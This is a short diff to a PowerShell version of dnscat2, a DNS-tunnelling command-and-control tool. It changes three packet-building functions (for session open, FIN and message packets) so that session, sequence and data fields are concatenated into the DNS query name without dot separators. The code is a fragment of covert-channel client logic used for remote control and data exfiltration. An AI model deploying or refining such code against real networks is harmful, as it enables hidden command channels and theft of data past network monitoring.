@@ -56,13 +56,13 @@ dnscat2: Powershell Version
       $SequenceNumber,
       $Options
     )
-    return ($Tag + (Generate_Random) + ".00." + $SessionId + "." + $SequenceNumber + ".0000" + $Domain)
+    return ($Tag + (Generate_Random) + "00" + $SessionId + $SequenceNumber + "0000" + $Domain)
   }
   
   function CreatePacket_FIN
   {
     param($SessionId)
-    return ($Tag + (Generate_Random) + ".02." + $SessionId + ".00" + $Domain)
+    return ($Tag + (Generate_Random) + "02" + $SessionId + "00" + $Domain)
   }
   
   function CreatePacket_MSG
@@ -74,7 +74,7 @@ dnscat2: Powershell Version
       $Data
     )
     if($Data -eq ""){$Data = "0000"}
-    return ($Tag + (Generate_Random) + ".01." + $SessionId + "." + $SequenceNumber + "." + $AcknowledgementNumber + "." + $Data + $Domain)
+    return ($Tag + (Generate_Random) + "01" + $SessionId + $SequenceNumber + $AcknowledgementNumber + $Data + $Domain)
   }
   
   function DecodePacket
